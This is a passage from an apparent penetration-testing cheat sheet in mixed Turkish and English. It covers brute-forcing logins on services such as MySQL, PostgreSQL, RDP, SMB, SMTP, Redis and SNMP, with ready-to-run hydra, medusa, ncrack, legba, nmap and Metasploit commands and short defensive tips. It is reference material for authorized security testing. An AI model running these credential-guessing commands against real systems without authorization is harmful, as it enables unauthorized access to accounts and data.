jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
LDAP (Lightweight Directory Access Protocol), hafif bir dizin erişim protokolüdür. Genellikle ağdaki dizin hizmetlerine erişmek için kullanılır. LDAP, kullanıcı kimlik doğrulama, yetkilendirme ve dizin hizmetlerine erişim gibi işlevleri destekler. Brute force saldırıları, LDAP sunucusuna erişmek için kullanılan bir yöntemdir. Bu saldırıda, saldırgan, kullanıcı adı ve şifre kombinasyonlarını deneyerek doğru kimlik bilgilerini bulmaya çalışır. Bu tür saldırılar, zayıf veya tahmin edilebilir şifreler kullanıldığında etkili olabilir.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol that is commonly used in IoT (Internet of Things) applications. It is designed to be simple and efficient, making it ideal for devices with limited resources and low bandwidth.

MQTT operates on a publish-subscribe model, where clients can publish messages to topics or subscribe to topics to receive messages. Topics are hierarchical in nature, allowing for a flexible and organized way of organizing messages.

Brute forcing MQTT involves attempting to guess the username and password combination to gain unauthorized access to an MQTT broker. This can be done using various tools and techniques, such as dictionary attacks, credential stuffing, or even exploiting weak passwords.

To perform a brute force attack on an MQTT broker, you would typically need a list of possible usernames and passwords. This can be obtained through various means, such as using common username and password combinations, using leaked credentials from other sources, or using tools that generate possible combinations.

Once you have the list of usernames and passwords, you can use a tool like `mosquitto_pub` or `mqtt-cli` to attempt to connect to the MQTT broker using each combination. The tool will iterate through the list and try each combination until a successful login is achieved or the list is exhausted.

It is important to note that brute forcing MQTT is considered unethical and illegal unless you have explicit permission from the owner of the MQTT broker. Unauthorized access to someone else's MQTT broker is a violation of their privacy and can lead to legal consequences.

If you are a security professional or a penetration tester, it is recommended to follow ethical guidelines and obtain proper authorization before attempting any brute force attacks.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

Mongo, kısaltması MongoDB olan bir NoSQL veritabanıdır. Brute force saldırıları, MongoDB sunucusuna erişim sağlamak için kullanılan yaygın bir yöntemdir. Bu saldırı türü, kullanıcı adı ve şifre kombinasyonlarını deneyerek doğru kimlik bilgilerini bulmayı amaçlar.

Brute force saldırıları, genellikle zayıf veya tahmin edilebilir şifreler kullanılarak gerçekleştirilir. Saldırganlar, oturum açma sayfasına doğru kullanıcı adı ve şifre kombinasyonlarını göndererek deneme yaparlar. Bu saldırı türü, saldırganın birçok farklı kombinasyonu denemesi gerektiği için zaman alıcı olabilir.

MongoDB sunucusuna karşı brute force saldırılarına karşı koymak için bazı önlemler almak önemlidir. Güçlü ve karmaşık şifreler kullanmak, saldırganların tahmin etmesini zorlaştırır. Ayrıca, oturum açma denemelerini sınırlayan bir otomatik kilit mekanizması kullanmak da faydalı olabilir. Bu mekanizma, belirli bir süre boyunca yanlış oturum açma denemeleri yapıldığında hesabı geçici olarak kilitler.

MongoDB sunucusuna karşı brute force saldırılarına karşı koymak için güvenlik duvarı kuralları da kullanılabilir. Bu kurallar, belirli IP adreslerinden gelen oturum açma denemelerini engelleyebilir veya sınırlayabilir. Ayrıca, güncellemeleri ve yamaları düzenli olarak uygulamak da güvenlik açıklarını azaltabilir.

Sonuç olarak, MongoDB sunucusuna karşı brute force saldırılarına karşı koymak için güçlü şifreler kullanmak, otomatik kilit mekanizmaları kullanmak ve güvenlik duvarı kuralları uygulamak önemlidir. Bu önlemler, saldırganların başarılı bir şekilde sisteme erişmesini zorlaştırabilir ve verilerin güvenliğini sağlayabilir.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL, Microsoft SQL Server'ın kısaltmasıdır. Bu, Microsoft tarafından geliştirilen ve yaygın olarak kullanılan bir ilişkisel veritabanı yönetim sistemidir. MSSQL, Windows tabanlı sistemlerde çalışır ve genellikle büyük ölçekli kurumsal uygulamalarda kullanılır.

MSSQL brute force saldırısı, bir saldırganın MSSQL sunucusuna erişmek için deneme yanılma yöntemini kullanmasıdır. Bu saldırıda, saldırgan bir kullanıcı adı ve şifre kombinasyonu listesi kullanarak sunucuya oturum açmaya çalışır. Saldırgan, doğru kullanıcı adı ve şifre kombinasyonunu bulana kadar farklı kombinasyonları denemeye devam eder.

Bu saldırı türü, zayıf veya tahmin edilebilir şifreler kullanan kullanıcı hesaplarını hedef alır. Saldırganlar, oturum açma denemelerini hızlandırmak için otomatik araçlar veya yazılımlar kullanabilirler. Bu nedenle, güçlü ve karmaşık şifreler kullanmak, MSSQL sunucusunun brute force saldırılarına karşı korunmasına yardımcı olabilir.

MSSQL brute force saldırılarına karşı korunmak için aşağıdaki önlemler alınabilir:

- Güçlü ve karmaşık şifreler kullanın.
- Oturum açma denemelerini sınırlayın ve otomatik araçları engelleyin.
- Güvenlik duvarı ve ağ filtreleme kullanarak erişimi sınırlayın.
- Güncel ve yamalanmış bir MSSQL sunucusu kullanın.
- Kullanıcı hesaplarını düzenli olarak denetleyin ve zayıf şifreleri değiştirin.

MSSQL brute force saldırılarına karşı savunmasız olan bir sunucu, saldırganın yetkisiz erişim elde etmesine ve hassas verilere erişmesine neden olabilir. Bu nedenle, MSSQL sunucusunun güvenliğini sağlamak için güvenlik önlemlerini uygulamak önemlidir.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL, açık kaynaklı bir ilişkisel veritabanı yönetim sistemidir. Birçok web uygulaması ve web sitesi tarafından kullanılan popüler bir veritabanıdır. MySQL, kullanıcıların verileri depolamalarına, yönetmelerine ve erişmelerine olanak tanır.

#### Brute Force Saldırısı

Brute force saldırısı, bir saldırganın bir hedefin kullanıcı adı ve şifresini tahmin etmek için tüm olası kombinasyonları denemesidir. MySQL'de brute force saldırısı, saldırganın bir kullanıcının şifresini doğru tahmin etmek için farklı şifre kombinasyonlarını denemesini içerir.

#### Brute Force Saldırısını Önleme

MySQL'de brute force saldırılarını önlemek için aşağıdaki adımları izleyebilirsiniz:

1. Güçlü Şifreler Kullanın: Kullanıcıların güçlü ve karmaşık şifreler kullanmalarını sağlayın. Şifrelerin büyük ve küçük harfler, rakamlar ve özel karakterler içermesi önerilir.

2. Şifre Deneme Sınırını Sınırlayın: MySQL'de şifre deneme sınırını sınırlayarak, bir kullanıcının belirli bir süre içinde belirli sayıda yanlış şifre denemesi yapmasını engelleyebilirsiniz.

3. IP Adresi Tabanlı Sınırlamalar: MySQL sunucusuna erişimi sınırlamak için IP adresi tabanlı sınırlamalar kullanabilirsiniz. Sadece belirli IP adreslerinden gelen isteklere izin vererek, saldırganların sunucuya erişimini engelleyebilirsiniz.

4. Güncellemeleri Uygulayın: MySQL'in güncellemelerini düzenli olarak uygulayarak, güvenlik açıklarını kapatır ve saldırılara karşı daha dirençli hale gelirsiniz.

5. Günlükleri İzleyin: MySQL günlüklerini izleyerek, şüpheli etkinlikleri tespit edebilir ve saldırı girişimlerini belirleyebilirsiniz.

Bu önlemleri uygulayarak, MySQL veritabanınızı brute force saldırılarına karşı koruyabilirsiniz.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
# OracleSQL

OracleSQL, Oracle veritabanı yönetim sistemi için kullanılan bir SQL dilidir. Brute force saldırıları, OracleSQL veritabanlarına erişim sağlamak için kullanılan yaygın bir yöntemdir.

Brute force saldırıları, bir saldırganın tüm olası kombinasyonları deneyerek doğru kimlik bilgilerini bulmaya çalıştığı bir saldırı türüdür. OracleSQL veritabanlarına brute force saldırıları gerçekleştirmek için çeşitli araçlar ve yöntemler mevcuttur.

Brute force saldırıları genellikle zayıf veya tahmin edilebilir parolaları hedef alır. Saldırganlar, kullanıcı adı ve parola kombinasyonlarını otomatik olarak deneyerek doğru kombinasyonu bulmaya çalışır.

OracleSQL veritabanlarına brute force saldırıları gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:

1. Kullanıcı adı ve parola listesi oluşturun.
2. Brute force aracını kullanarak kullanıcı adı ve parola kombinasyonlarını deneyin.
3. Başarılı bir kimlik doğrulama gerçekleştirildiğinde, erişim sağlanır.

Brute force saldırıları, güvenlik açıklarını tespit etmek ve zayıf parolaları güçlendirmek için kullanılabilir. Ancak, bu tür saldırılar yasa dışıdır ve yalnızca yasal izinlerle gerçekleştirilmelidir.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
**oracle_login**'i **patator** ile kullanmak için **yükleme** yapmanız gerekmektedir:
```bash
pip3 install cx_Oracle --upgrade
```
[Çevrimdışı OracleSQL hash bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**sürümler 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
POP (Post Office Protocol), e-posta istemcilerinin e-posta sunucusuna erişmek için kullandığı bir protokoldür. POP, e-posta mesajlarını sunucudan indirir ve yerel bir cihazda depolar. POP, kullanıcı adı ve şifre kombinasyonlarıyla sunucuya bağlanır ve brute force saldırılarına karşı savunmasız olabilir. Brute force saldırıları, tüm olası şifre kombinasyonlarını deneyerek doğru şifreyi bulmaya çalışır. Bu saldırı türü, zayıf veya tahmin edilebilir şifreler kullanıldığında etkili olabilir. POP sunucusuna brute force saldırısı yaparken, bir saldırgan genellikle oturum açma isteklerini otomatik olarak gönderen bir yazılım kullanır. Bu yazılım, farklı şifre kombinasyonlarını denemek için bir sözlük saldırısı veya brute force saldırısı gerçekleştirebilir.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL, açık kaynaklı bir ilişkisel veritabanı yönetim sistemidir (RDBMS). Brute force saldırıları, PostgreSQL veritabanlarını hedef almak için kullanılan yaygın bir yöntemdir. Bu saldırılar, kullanıcı adı ve şifre kombinasyonlarını deneyerek veritabanına yetkisiz erişim elde etmeyi amaçlar.

Brute force saldırıları genellikle oturum açma formlarına veya kimlik doğrulama mekanizmalarına uygulanır. Saldırganlar, kullanıcı adı ve şifre kombinasyonlarını otomatik olarak deneyerek doğru kombinasyonu bulmaya çalışır. Bu saldırılar genellikle zaman alıcıdır, çünkü saldırganların tüm olası kombinasyonları denemesi gerekebilir.

PostgreSQL brute force saldırılarına karşı korunmak için bazı önlemler alınabilir. İşte bazı öneriler:

- Güçlü şifreler kullanın: Karmaşık ve tahmin edilmesi zor şifreler kullanarak saldırganların şifreleri tahmin etmesini zorlaştırın.
- Şifre deneme sınırlamaları uygulayın: Oturum açma denemelerini sınırlayan bir mekanizma kullanarak saldırganların sonsuz deneme yapmasını önleyin.
- İki faktörlü kimlik doğrulama kullanın: İki faktörlü kimlik doğrulama, saldırganların sadece kullanıcı adı ve şifreyle oturum açmasını engeller.
- Güncellemeleri takip edin: PostgreSQL'in güncellemelerini düzenli olarak kontrol edin ve güvenlik yamalarını uygulayın.
- Güvenlik duvarı kullanın: PostgreSQL sunucusuna erişimi sınırlayan bir güvenlik duvarı kullanarak saldırıları engelleyin.

Bu önlemler, PostgreSQL veritabanınızı brute force saldırılarına karşı daha güvenli hale getirecektir. Ancak, herhangi bir güvenlik önlemi tamamen güvenliği garanti etmez, bu yüzden düzenli olarak güvenlik kontrolleri yapmak önemlidir.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

`.deb` paketini indirmek için [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) adresine gidin.
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol), uzak bir bilgisayara erişmek için kullanılan bir protokoldür. RDP brute force saldırıları, bir saldırganın hedeflenen bir RDP sunucusuna oturum açmak için birden çok kullanıcı adı ve şifre kombinasyonunu denemesini içerir.

Bu saldırı türü, saldırganın oturum açma bilgilerini tahmin etmek veya kaba kuvvet yöntemiyle bulmak için otomatik araçlar kullanmasını sağlar. Saldırgan, genellikle yaygın kullanılan kullanıcı adları ve şifreleri kullanarak oturum açma girişimlerinde bulunur.

RDP brute force saldırılarına karşı korunmak için aşağıdaki önlemleri almak önemlidir:

- Güçlü şifreler kullanın ve düzenli olarak değiştirin.
- Kullanıcı adı ve şifre kombinasyonlarını tahmin etmek için otomatik araçlara karşı koruma sağlayan bir oturum açma politikası uygulayın.
- RDP sunucusuna erişimi sınırlayın ve yalnızca güvenilir IP adreslerinden gelen bağlantılara izin verin.
- RDP sunucusunu güncel tutun ve güvenlik yamalarını düzenli olarak uygulayın.
- İki faktörlü kimlik doğrulama gibi ek güvenlik önlemlerini kullanın.

RDP brute force saldırılarına karşı dikkatli olmak ve güvenlik önlemlerini uygulamak, bilgisayarınızın ve ağınızın güvenliğini sağlamak için önemlidir.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis, bir açık kaynaklı, anahtar-değer tabanlı bir veritabanıdır. Brute force saldırıları, Redis sunucusuna erişmek için kullanılan yaygın bir yöntemdir. Brute force saldırıları, bir saldırganın tüm olası şifre kombinasyonlarını deneyerek doğru şifreyi bulmaya çalıştığı bir saldırı türüdür.

Brute force saldırıları, genellikle zayıf veya tahmin edilebilir şifreler kullanıldığında etkili olabilir. Saldırganlar, genellikle bir şifre listesi veya bir kelime listesi kullanarak saldırı gerçekleştirirler. Bu listeler, en yaygın kullanılan şifreleri veya tahmin edilebilir şifre kombinasyonlarını içerebilir.

Redis sunucusuna brute force saldırısı gerçekleştirmek için, saldırganlar genellikle bir otomasyon aracı veya özel yazılım kullanır. Bu araçlar, otomatik olarak şifre kombinasyonlarını deneyerek doğru şifreyi bulmaya çalışır.

Brute force saldırılarına karşı korunmak için, güçlü ve tahmin edilemez şifreler kullanmak önemlidir. Ayrıca, Redis sunucusuna erişimi sınırlayan güvenlik önlemleri almak da önemlidir. Örneğin, güçlü bir şifre gerektiren bir kimlik doğrulama mekanizması kullanmak veya IP tabanlı erişim kontrolü uygulamak gibi önlemler alınabilir.

Redis sunucusuna brute force saldırısı gerçekleştirildiğinde, saldırıyı tespit etmek ve saldırıyı durdurmak için gerekli önlemleri almak önemlidir. Bu, günlük kayıtlarını izlemek, şüpheli etkinlikleri tespit etmek ve saldırıyı engellemek için gerekli adımları atmak anlamına gelebilir.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
Rexec, also known as Remote Execution, is a network service that allows users to execute commands on a remote system. It is commonly used for administrative purposes, such as managing multiple systems from a central location. Rexec operates on TCP port 512 and uses a simple authentication mechanism based on a username and password.

Rexec can be vulnerable to brute force attacks, where an attacker attempts to guess the correct username and password combination to gain unauthorized access to the remote system. Brute forcing is a common technique used by hackers to exploit weak or easily guessable credentials.

To protect against brute force attacks on Rexec, it is important to use strong and complex passwords that are not easily guessable. Additionally, implementing account lockout policies can help prevent repeated login attempts by locking out an account after a certain number of failed login attempts.

It is also recommended to monitor Rexec logs for any suspicious activity, such as multiple failed login attempts from the same IP address. This can help identify and mitigate brute force attacks in real-time.

Overall, securing Rexec involves a combination of strong authentication mechanisms, password policies, and monitoring for suspicious activity to prevent unauthorized access to remote systems.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
Rlogin, Remote Login (Uzaktan Giriş) protokolünü kullanarak bir sunucuya uzaktan erişim sağlar. Bu protokol, kullanıcı adı ve şifre gibi kimlik doğrulama bilgilerini şifrelemeksizin ilettiği için güvenlik açığına sahiptir. Bu nedenle, rlogin kullanırken dikkatli olunmalı ve güvenli alternatifler tercih edilmelidir.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
Rsh (Remote Shell) is a network protocol that allows users to execute commands on a remote system. It is commonly used for remote administration tasks. Rsh operates on port 514 and uses a simple authentication mechanism based on the client's IP address. However, this authentication method is insecure and can be easily bypassed.

To perform a brute force attack on Rsh, you can use tools like Hydra or Medusa. These tools automate the process of trying different username and password combinations until a successful login is found. It is important to note that brute forcing is an aggressive and potentially illegal technique, so it should only be used with proper authorization and for legitimate purposes.

When conducting a brute force attack on Rsh, it is recommended to use a wordlist containing common usernames and passwords. Additionally, you can customize the attack by specifying the number of parallel connections, the delay between attempts, and other parameters.

To protect against brute force attacks on Rsh, it is recommended to disable the service if it is not needed or to implement stronger authentication mechanisms, such as using SSH instead. Additionally, monitoring the network for suspicious activity and implementing account lockout policies can help mitigate the risk of brute force attacks.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync, klasörlerin ve dosyaların bir sunucu ile senkronize edilmesini sağlayan bir veri transfer protokolüdür. Rsync, veri transferini hızlandırmak için yalnızca değişen veya eksik olan dosyaları kopyalar. Bu, büyük dosya veya klasörlerin senkronizasyonunu hızlı ve verimli hale getirir.

Rsync, ağ üzerindeki veri transferini güvenli hale getirmek için SSH (Secure Shell) protokolünü kullanır. Bu nedenle, kullanıcı adı ve şifre gibi kimlik doğrulama bilgileri şifrelenir ve güvenli bir şekilde iletilir.

Rsync, birçok farklı senaryoda kullanılabilir. Örneğin, sunucular arasında dosya senkronizasyonu, yedekleme işlemleri veya veri taşıma işlemleri için kullanılabilir. Rsync'in esnek yapılandırma seçenekleri vardır ve kullanıcıların senaryolarına uyacak şekilde özelleştirilebilir.

Rsync, hedef sunucuda bulunan dosyaların ve klasörlerin birebir kopyasını oluşturur. Bu nedenle, hedef sunucuda herhangi bir değişiklik yapılırsa, bu değişiklikler kaybolabilir veya üzerine yazılabilir. Bu nedenle, Rsync kullanırken dikkatli olmak ve senkronizasyon işlemlerini doğru şekilde yapılandırmak önemlidir.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol), gerçek zamanlı medya sunucusu ve istemcisi arasında iletişim kurmak için kullanılan bir ağ protokolüdür. RTSP, video ve ses akışlarını kontrol etmek, yönetmek ve iletmek için kullanılır. Bu protokol, IP kameralar, medya sunucuları ve diğer multimedya cihazları arasında yaygın olarak kullanılır.

RTSP brute force saldırısı, bir saldırganın RTSP sunucusuna erişmek için kullanıcı adı ve şifre kombinasyonlarını denemesini içerir. Bu saldırı türü, zayıf veya tahmin edilebilir kimlik doğrulama bilgilerine sahip RTSP sunucularını hedef alır.

Brute force saldırıları genellikle otomatik araçlar veya özel yazılımlar kullanılarak gerçekleştirilir. Saldırganlar, genellikle kullanıcı adı ve şifre kombinasyonlarını bir kelime listesinden veya tahmin edilebilir kombinasyonlardan oluşturarak deneme yaparlar. Bu saldırı türü, zayıf veya varsayılan kimlik doğrulama bilgilerine sahip RTSP sunucularını hedef alır.

RTSP brute force saldırılarına karşı korunmanın en iyi yolu, güçlü ve karmaşık kimlik doğrulama bilgileri kullanmaktır. Kullanıcı adı ve şifre kombinasyonlarını tahmin edilemeyecek şekilde oluşturmak ve düzenli olarak değiştirmek önemlidir. Ayrıca, RTSP sunucusuna erişimi sınırlamak ve güvenlik duvarı veya ağ filtreleme gibi ek önlemler almak da saldırılardan korunmaya yardımcı olabilir.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
SFTP (Secure File Transfer Protocol) is a secure alternative to FTP (File Transfer Protocol) that allows for the secure transfer of files between a client and a server. It uses SSH (Secure Shell) to establish a secure connection and encrypts the data being transferred.

SFTP can be used for various purposes, such as securely transferring files between systems, backing up data, and synchronizing files between different locations. It provides authentication and encryption mechanisms to ensure the confidentiality and integrity of the transferred data.

To connect to an SFTP server, you will need the server's hostname or IP address, a username, and a password or SSH key. Once connected, you can use commands similar to those used in FTP to navigate the server's file system, upload and download files, and perform other file operations.

When using SFTP, it is important to follow security best practices to protect your data. This includes using strong passwords or SSH keys, regularly updating your SFTP client and server software, and monitoring for any suspicious activity.

Overall, SFTP is a reliable and secure method for transferring files over a network, providing encryption and authentication to ensure the privacy and integrity of your data.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP (Simple Network Management Protocol), basit bir ağ yönetim protokolüdür. SNMP, ağ cihazlarının durumunu izlemek, performans istatistiklerini toplamak ve ağ yönetimi için bilgi sağlamak için kullanılır. SNMP, ağ cihazlarına yönelik bir dizi standart yönetim bilgisi tabanlı nesne (MIB) kullanır. Bu nesneler, ağ cihazlarının durumunu ve performansını temsil eden verileri içerir.

SNMP, ağ cihazlarına yönelik saldırılar için bir hedef olabilir. Brute force saldırıları, SNMP protokolünü hedef alarak ağ cihazlarının yönetim bilgilerine erişmeye çalışır. Bu saldırılar, varsayılan veya zayıf parolaları deneyerek SNMP cihazlarına yetkisiz erişim sağlamayı amaçlar.

SNMP brute force saldırıları, bir saldırganın birçok farklı parolayı hızlı bir şekilde denemesini gerektirir. Bu saldırıları gerçekleştirmek için çeşitli araçlar ve yöntemler mevcuttur. Saldırganlar, genellikle bir sözlük saldırısı veya tüm olası kombinasyonları deneyen bir brute force saldırısı kullanır.

SNMP brute force saldırılarına karşı korunmak için güçlü parolalar kullanmak önemlidir. Varsayılan parolaları değiştirmek ve karmaşık, uzun ve rastgele parolalar kullanmak, saldırganların erişim sağlamasını zorlaştırır. Ayrıca, SNMP erişimini sınırlamak ve güvenlik duvarları veya ağ erişim denetim listeleri kullanmak da saldırı riskini azaltabilir.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
#### Brute Force

SMB (Server Message Block) brute force attacks involve attempting to gain unauthorized access to a target system by systematically trying different username and password combinations. This technique is commonly used to exploit weak or default credentials on SMB servers.

##### Tools

- **Hydra**: A popular command-line tool for performing brute force attacks. It supports various protocols, including SMB.
- **Medusa**: Another command-line tool that supports SMB brute forcing.
- **Ncrack**: A high-speed network authentication cracking tool that can be used for SMB brute forcing.

##### Methodology

1. **Enumerate Users**: Gather information about valid usernames on the target system. This can be done using tools like **enum4linux** or **nmap**.
2. **Create Wordlist**: Generate a wordlist containing potential passwords. This can be done using tools like **Cupp** or **Crunch**.
3. **Perform Brute Force**: Use a brute force tool like **Hydra**, **Medusa**, or **Ncrack** to systematically try different username and password combinations.
4. **Analyze Results**: Analyze the results of the brute force attack to identify successful login credentials.
5. **Exploit Access**: Once valid credentials are obtained, use them to gain unauthorized access to the target system.

##### Best Practices to Prevent SMB Brute Force Attacks

- Use strong and unique passwords for all user accounts.
- Implement account lockout policies to prevent multiple failed login attempts.
- Disable or rename default administrator accounts.
- Regularly update and patch SMB servers to fix any security vulnerabilities.
- Monitor and log failed login attempts to detect and respond to brute force attacks.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
SMTP (Simple Mail Transfer Protocol), basit bir posta aktarım protokolüdür. SMTP, e-posta göndermek için kullanılan standart bir iletişim protokolüdür. SMTP sunucusu, e-posta istemcileri tarafından kullanılır ve e-posta iletilerini alıcı sunucuya iletmek için kullanılır.

SMTP brute force saldırısı, bir saldırganın SMTP sunucusuna birden fazla kullanıcı adı ve şifre kombinasyonu deneyerek yetkisiz erişim elde etmeye çalıştığı bir saldırı türüdür. Bu saldırı, zayıf veya tahmin edilebilir şifreler kullanan kullanıcı hesaplarını hedef alır.

SMTP brute force saldırılarını önlemek için aşağıdaki önlemler alınabilir:

- Güçlü şifre politikaları uygulamak: Kullanıcıların karmaşık ve güçlü şifreler kullanmalarını sağlamak için şifre politikaları belirlenmelidir.
- Hesap kilit mekanizmaları: Belirli bir süre içinde yanlış şifre denemeleri yapan hesapları otomatik olarak kilitleyen bir mekanizma kullanılmalıdır.
- İki faktörlü kimlik doğrulama (2FA): Kullanıcıların hesaplarına ek bir güvenlik katmanı eklemek için 2FA kullanılabilir.
- Güncel yazılım ve güvenlik yamaları: SMTP sunucusu ve diğer ilgili yazılımların güncel ve güvenlik yamalarıyla korunduğundan emin olunmalıdır.

SMTP brute force saldırılarına karşı savunmasız olan sistemler, saldırganların yetkisiz erişim elde etmesine ve hassas e-posta verilerinin tehlikeye atılmasına neden olabilir. Bu nedenle, güvenlik önlemlerinin düzgün bir şekilde uygulanması önemlidir.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
SOCKS (Socket Secure) protokolü, ağ trafiğini bir ağdaki bir sunucu üzerinden yönlendirmek için kullanılan bir protokoldür. SOCKS, TCP/IP tabanlı uygulamaların güvenli bir şekilde çalışmasını sağlar ve ağ trafiğini şifreleyerek gizlilik sağlar. SOCKS, bir proxy sunucusu aracılığıyla çalışır ve kullanıcıların kimlik doğrulamasını gerektirebilir. Brute force saldırıları, SOCKS protokolünü hedef alabilir ve kullanıcı adı ve şifre kombinasyonlarını deneyerek yetkilendirme bilgilerini elde etmeye çalışabilir. Bu saldırı türü, güçlü şifreler kullanılmadığında etkili olabilir.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server, Microsoft tarafından geliştirilen ve yaygın olarak kullanılan bir ilişkisel veritabanı yönetim sistemidir. SQL Server, Windows işletim sistemleri üzerinde çalışır ve veritabanı yönetimi, veri depolama, veri güvenliği ve veri erişimi gibi birçok özelliği destekler.

#### Brute Force Saldırısı

Brute force saldırısı, bir saldırganın tüm olası kombinasyonları deneyerek kullanıcı adı ve şifre gibi giriş bilgilerini tahmin etmeye çalıştığı bir saldırı yöntemidir. SQL Server'da brute force saldırısı, saldırganın SQL Server'a erişmek için kullanıcı adı ve şifre kombinasyonlarını denemesini içerir.

Bu saldırı türü, zayıf veya tahmin edilebilir şifreler kullanıldığında etkili olabilir. Saldırgan, oturum açma ekranında kullanıcı adı ve şifreleri denemek için otomatik bir araç veya özel yazılım kullanabilir. Brute force saldırıları genellikle zaman alıcıdır, çünkü tüm kombinasyonları denemek için çok fazla zaman gerektirebilir.

SQL Server'da brute force saldırılarına karşı korunmak için aşağıdaki önlemler alınabilir:

